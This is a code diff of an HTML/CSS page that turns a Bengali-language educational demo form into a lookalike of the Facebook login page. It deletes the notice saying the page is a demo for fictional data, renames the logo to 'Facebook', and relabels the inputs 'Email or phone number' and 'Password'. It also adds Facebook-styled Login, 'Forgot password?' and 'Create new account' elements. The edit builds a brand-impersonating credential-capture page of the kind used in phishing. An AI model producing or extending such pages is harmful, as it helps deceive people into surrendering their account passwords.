@@ -131,6 +131,41 @@ input:focus {
 
 }
 
+.forgot {
+  display: block;
+  text-align: center;
+  color: #1877f2;
+  text-decoration: none;
+  font-size: 16px;
+  margin: 16px 0;
+}
+
+.forgot:hover {
+  text-decoration: underline;
+}
+
+.divider {
+  border: 0;
+  border-top: 1px solid #dadde1;
+  margin: 20px 0;
+}
+
+.create-account {
+  display: block;
+  width: fit-content;
+  margin: 0 auto;
+  padding: 14px 25px;
+  background: #36b52b;
+  color: white;
+  text-decoration: none;
+  font-size: 18px;
+  font-weight: bold;
+  border-radius: 8px;
+}
+
+.create-account:hover {
+  background: #2e9f25;
+}
 </style>
 </head>
 
@@ -140,11 +175,10 @@ input:focus {
 
   <div class="left">
 
-    <div class="logo">Social Demo</div>
+    <div class="logo">Facebook</div>
 
     <p>
-      এটি HTML, CSS ও JavaScript শেখার
-      জন্য তৈরি একটি পরীক্ষামূলক ওয়েব ফর্ম।
+      connect with friends and the world around you on facebook
     </p>
 
   </div>
@@ -152,25 +186,14 @@ input:focus {
 
   <div class="card">
 
-    <div class="notice">
-      এটি একটি শিক্ষামূলক ডেমো।
-      এখানে শুধু কাল্পনিক তথ্য ব্যবহার করুন।
-    </div>
-
+ 
     <form id="demoForm">
 
-      <input
-        type="text"
-        name="name"
-        placeholder="কাল্পনিক নাম"
-        maxlength="60"
-        required
-      >
-
+    
       <input
         type="email"
         name="email"
-        placeholder="পরীক্ষামূলক ইমেইল"
+        placeholder="Email or phone number"
         maxlength="120"
         required
       >
@@ -178,14 +201,23 @@ input:focus {
       <input
         type="text"
         name="note"
-        placeholder="মন্তব্য (ঐচ্ছিক)"
+        placeholder="Password"
         maxlength="200"
       >
 
       <button class="login" type="submit">
-        ডেমো তথ্য পাঠাও
+        Login
       </button>
 
+      <a href="#" class="forgot" onclick="return false;">
+  Forgot password?
+</a>
+
+<hr class="divider">
+
+<a href="#" class="create-account" onclick="return false;">
+  Create new account
+</a>
     </form>
 
     <p id="status" class="status"></p>
